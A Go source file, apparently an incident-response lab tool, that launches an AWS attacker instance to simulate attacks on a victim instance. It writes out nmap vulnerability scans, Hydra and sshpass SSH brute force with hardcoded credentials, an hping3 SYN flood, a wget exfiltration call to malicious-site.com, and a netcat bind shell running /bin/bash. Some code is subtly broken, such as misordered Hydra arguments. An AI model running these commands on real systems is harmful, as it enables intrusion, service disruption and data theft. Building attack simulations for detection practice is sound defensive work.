package incident_response

import (
	"fmt"

	"github.com/aws/aws-sdk-go-v2/aws"
)

const (
	usernamebf = "jon"
	passwordbf = "michelle"
)

// Simulate Nmap noisy (aggressive) attack
func simulateNoisyNmapAttack(cfg aws.Config) error {
	_, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
	if err != nil {
		return fmt.Errorf("failed to get or launch attacker instance: %v", err)
	}

	victimIPAddress, err := getVictimIPAddress(cfg)
	if err != nil {
		return fmt.Errorf("failed to get victim IP: %v", err)
	}

	// Nmap "noisy" command to scan all ports, using multiple scan types (-A enables aggressive scan, -T4 sets faster timing)
	nmapCommand := fmt.Sprintf("sudo nmap -A -T5 -p- -sS  --script vuln  %s", victimIPAddress)
	// Execute Nmap command
	fmt.Printf("Running noisy Nmap scan from attacker instance %s to victim IP %s...\n", attackerIPAddress, victimIPAddress)
	err = executeSSHCommand(attackerIPAddress, nmapCommand)
	if err != nil {
		return fmt.Errorf("failed to execute noisy Nmap attack: %v", err)
	}

	return nil
}

// Simulate Nmap attack
func simulateNmapAttack(cfg aws.Config) error {
	_, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
	if err != nil {
		return fmt.Errorf("failed to get or launch attacker instance: %v", err)
	}

	victimIPAddress, err := getVictimIPAddress(cfg)
	if err != nil {
		return fmt.Errorf("failed to get victim IP: %v", err)
	}

	// Nmap command to scan victim instance
	nmapCommand := fmt.Sprintf("sudo nmap -sS -T5 -p- %s", victimIPAddress)
	err = executeSSHCommand(attackerIPAddress, nmapCommand)
	if err != nil {
		return fmt.Errorf("failed to execute Nmap attack: %v", err)
	}
	return nil
}

// Simulate Hydra brute force attack with rockyou.txt or fixed password based on flag
func simulateHydraAttack(cfg aws.Config, longwait bool) error {
	_, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
	if err != nil {
		return fmt.Errorf("failed to get or launch attacker instance: %v", err)
	}

	// Clean up any existing hydra.restore file before starting the attack
	cleanupRestoreFileCommand := "rm -f ./hydra.restore"
	err = executeSSHCommand(attackerIPAddress, cleanupRestoreFileCommand)
	if err != nil {
		fmt.Printf("Warning: failed to remove hydra.restore file. Proceeding with the attack.\n")
	}

	victimIPAddress, err := getVictimIPAddress(cfg)
	if err != nil {
		return fmt.Errorf("failed to get victim IP: %v", err)
	}

	// Step 1: Ensure rockyou.txt wordlist is already present on the attacker instance
	if longwait {
		checkRockyouCommand := "test -f rockyou.txt && echo 'File exists' || echo 'File does not exist'"
		checkOutput, err := executeSSHCommandWithOutput(attackerIPAddress, checkRockyouCommand)
		if err != nil {
			return fmt.Errorf("failed to check if rockyou.txt exists on attacker instance: %v", err)
		}

		if checkOutput == "File does not exist\n" {
			// If rockyou.txt is not present, download and decompress it
			downloadRockyouCommand := "wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz -O rockyou.txt.tar.gz && tar -xvzf rockyou.txt.tar.gz"
			fmt.Println("Downloading rockyou.txt wordlist on attacker instance...")
			err = executeSSHCommand(attackerIPAddress, downloadRockyouCommand)
			if err != nil {
				return fmt.Errorf("failed to download rockyou.txt on attacker instance: %v", err)
			}
		} else {
			fmt.Println("rockyou.txt already exists on the attacker instance. Skipping download.")
		}
	}

	// Step 2: Hydra brute force attack command using either rockyou.txt or fixed password
	var attackCommand string
	if longwait {
		// Use rockyou.txt for brute force and increase the timeout for longer search duration
		fmt.Println("Running Hydra brute force attack with rockyou.txt wordlist...")
		attackCommand = fmt.Sprintf("timeout 300 hydra -l %s -P rockyou.txt -t 4 -W -S -V -v -e ns -f ssh://%s ", usernamebf, victimIPAddress)
	} else {
		for i := 0; i < 10; i++ {
			// Use a fixed password (password) for the root user
			attackCommand = fmt.Sprintf("hydra -l %s -p %s -t 4 -S -V -v -f ssh://%s", usernamebf, victimIPAddress, passwordbf)
		}
	}

	// Run the brute force attack with Hydra
	fmt.Printf("Running Hydra brute force attack from attacker instance %s to victim IP %s...\n", attackerIPAddress, victimIPAddress)
	s, err := executeSSHCommandWithOutput(attackerIPAddress, attackCommand)
	fmt.Println(s)
	if err != nil {
		return fmt.Errorf("failed to execute Hydra attack command via SSH: %v", err)
	}
	// sudo -i
	fmt.Printf("Running sudo -i command from attacker instance %s to victim IP %s...\n", attackerIPAddress, victimIPAddress)
	pe := "sudo -i"
	s, err = executeSSHCommandWithOutput(attackerIPAddress, pe)
	fmt.Println(s)
	if err != nil {
		return fmt.Errorf("failed to execute Hydra attack command via SSH: %v", err)
	}

	// Step 3: Revert the SSH configuration to secure the victim
	disablePasswordAuthCommand := `
		sudo sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config &&
		sudo systemctl restart sshd
	`

	fmt.Println("Reverting SSH configuration on the victim instance...")
	s, err = executeSSHCommandWithOutput(victimIPAddress, disablePasswordAuthCommand)
	fmt.Println(s)
	if err != nil {
		return fmt.Errorf("failed to revert SSH configuration on victim instance: %v", err)
	}

	return nil
}

// Simulate DoS (Denial of Service) attack
func simulateDoSAttack(cfg aws.Config) error {
	_, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
	if err != nil {
		return fmt.Errorf("failed to get or launch attacker instance: %v", err)
	}

	victimIPAddress, err := getVictimIPAddress(cfg)
	if err != nil {
		return fmt.Errorf("failed to get victim IP: %v", err)
	}

	// Command to simulate DoS attack by sending a large number of ping requests
	dosCommand := fmt.Sprintf("timeout 300 hping3 -S --flood -V -p 80 %s", victimIPAddress)

	// Run the DoS attack
	fmt.Printf("Running DoS attack from attacker instance %s to victim IP %s...\n", attackerIPAddress, victimIPAddress)
	err = executeSSHCommand(attackerIPAddress, dosCommand)
	if err != nil {
		return fmt.Errorf("failed to execute DoS attack command via SSH: %v", err)
	}

	return nil
}

// Simulate Data Exfiltration attempt
func simulateDataExfiltration(cfg aws.Config) error {
	_, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
	if err != nil {
		return fmt.Errorf("failed to get or launch attacker instance: %v", err)
	}

	// Command to simulate data exfiltration using wget
	dataExfiltrationCommand := fmt.Sprintf("wget --post-data 'sensitive data' http://malicious-site.com/upload -O -")

	// Run the data exfiltration attempt
	fmt.Printf("Running data exfiltration attempt from attacker instance %s...\n", attackerIPAddress)
	err = executeSSHCommand(attackerIPAddress, dataExfiltrationCommand)
	if err != nil {
		return fmt.Errorf("failed to execute data exfiltration attempt: %v", err)
	}

	return nil
}

// Simulate Blind Shell towards the victim instance
func simulateBlindShell(cfg aws.Config) error {
	_, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
	if err != nil {
		return fmt.Errorf("failed to get or launch attacker instance: %v", err)
	}

	victimIPAddress, err := getVictimIPAddress(cfg)
	if err != nil {
		return fmt.Errorf("failed to get victim IP: %v", err)
	}

	// Step 1: Execute a blind shell command on the victim
	blindShellCommand := fmt.Sprintf(`
		while true; do 
			read -p 'Command: ' cmd;
			$cmd > /dev/null 2>&1;
		done
	`)

	// Step 2: Send the blind shell command to the victim's instance
	fmt.Printf("Launching blind shell on victim instance %s from attacker instance %s...\n", victimIPAddress, attackerIPAddress)
	err = executeSSHCommand(victimIPAddress, blindShellCommand)
	if err != nil {
		return fmt.Errorf("failed to execute blind shell on victim: %v", err)
	}

	return nil
}

/*
	aws ec2 create-network-acl-entry --network-acl-id acl-0881e982be94d9f6c --ingress --rule-number 101 --protocol tcp --port-range From=4444,To=4444 --cidr-block 0.0.0.0/0 --rule-action allow

 	aws ec2 create-network-acl-entry --network-acl-id acl-0881e982be94d9f6c --egress --rule-number 101 --protocol tcp --port-range From=4444,To=4444 --cidr-block 0.0.0.0/0 --rule-action allow

*/
// Simulate Blind Shell towards the victim instance with improved SSH handling
func simulateBlindShellWithPortControl(cfg aws.Config) error {
	// Step 1: Launch or get the attacker and victim instances
	_, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
	if err != nil {
		return fmt.Errorf("failed to get or launch attacker instance: %v", err)
	}

	victimIPAddress, err := getVictimIPAddress(cfg)
	if err != nil {
		return fmt.Errorf("failed to get victim IP: %v", err)
	}

	// Step 2: Test SSH connection with a simple echo command
	testSSHCommand := "echo 'SSH Connection Test'"
	fmt.Println("Testing SSH connection to victim instance...")
	output, err := executeSSHCommandWithOutput(victimIPAddress, testSSHCommand)
	if err != nil {
		return fmt.Errorf("SSH connection test failed: %v", err)
	}
	fmt.Printf("SSH connection successful, output: %s\n", output)

	// Step 3: Check if Netcat (nc) is installed on the victim instance
	fmt.Println("Checking if Netcat is installed on the victim instance...")
	checkNetcatCommand := "command -v nc"
	netcatOutput, err := executeSSHCommandWithOutput(victimIPAddress, checkNetcatCommand)
	if err != nil {
		return fmt.Errorf("failed to check Netcat on victim instance: %v", err)
	}
	if netcatOutput == "" {
		// Install Netcat if not found
		fmt.Println("Netcat not found, installing...")
		installNetcatCommand := "sudo yum install -y nmap-ncat"
		installNetcatOutput, err := executeSSHCommandWithOutput(victimIPAddress, installNetcatCommand)
		if err != nil {
			return fmt.Errorf("failed to install Netcat on victim instance: %v", err)
		}
		fmt.Printf("Netcat installation output: %s\n", installNetcatOutput)
	} else {
		fmt.Println("Netcat is already installed.")
	}

	// Step 4: Check if iptables is available on the victim instance
	fmt.Println("Checking if iptables is available on the victim instance...")
	checkIptablesCommand := "command -v iptables"
	iptablesOutput, err := executeSSHCommandWithOutput(victimIPAddress, checkIptablesCommand)
	if err != nil || iptablesOutput == "" {
		return fmt.Errorf("iptables is not available on the victim instance")
	}
	fmt.Println("iptables is available.")

	// Step 5: Open a port (e.g., 4444) on the victim machine to allow incoming connections
	openPortCommand := "sudo iptables -A INPUT -p tcp --dport 4444 -j ACCEPT"
	fmt.Println("Opening port 4444 on victim instance...")
	openPortOutput, err := executeSSHCommandWithOutput(victimIPAddress, openPortCommand)
	if err != nil {
		return fmt.Errorf("failed to open port 4444 on victim instance: %v", err)
	}
	fmt.Printf("Port open command output: %s\n", openPortOutput)

	// Step 6: Set up a reverse shell listener on the victim machine using Netcat
	blindShellCommand := "nohup nc -lvp 4444 -e /bin/bash > /dev/null 2>&1 &"
	fmt.Println("Setting up blind shell on victim instance...")
	blindShellOutput, err := executeSSHCommandWithOutput(victimIPAddress, blindShellCommand)
	if err != nil {
		return fmt.Errorf("failed to set up blind shell on victim instance: %v", err)
	}
	fmt.Printf("Blind shell setup output: %s\n", blindShellOutput)

	// Step 7: Connect from the attacker to the victim's blind shell on port 4444
	connectCommand := fmt.Sprintf("nc %s 4444", victimIPAddress)
	fmt.Printf("Connecting from attacker instance %s to victim instance %s on port 4444...\n", attackerIPAddress, victimIPAddress)
	connectOutput, err := executeSSHCommandWithOutput(attackerIPAddress, connectCommand)
	if err != nil {
		return fmt.Errorf("failed to connect to victim's blind shell: %v", err)
	}
	fmt.Printf("Connection output: %s\n", connectOutput)

	// Step 8: After the attack, close the port on the victim to secure it
	closePortCommand := "sudo iptables -D INPUT -p tcp --dport 4444 -j ACCEPT"
	fmt.Println("Closing port 4444 on victim instance...")
	closePortOutput, err := executeSSHCommandWithOutput(victimIPAddress, closePortCommand)
	if err != nil {
		return fmt.Errorf("failed to close port 4444 on victim instance: %v", err)
	}
	fmt.Printf("Port close command output: %s\n", closePortOutput)

	return nil
}

// simulate a brute force attack on the victim instance ssh
func simulateBruteForceAttack(cfg aws.Config) error {
	_, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
	if err != nil {
		return fmt.Errorf("failed to get or launch attacker instance: %v", err)
	}

	victimIPAddress, err := getVictimIPAddress(cfg)
	if err != nil {
		return fmt.Errorf("failed to get victim IP: %v", err)
	}

	// Dynamically construct the brute force attack command with the victim's IP
	bruteForceCommand := fmt.Sprintf("for i in {1..10000}; do sshpass -p test ssh -o StrictHostKeyChecking=no jon@%s; done", victimIPAddress)

	err = executeSSHCommand(attackerIPAddress, bruteForceCommand)
	if err != nil {
		return fmt.Errorf("failed to execute brute force attack: %v", err)
	}
	return nil
}
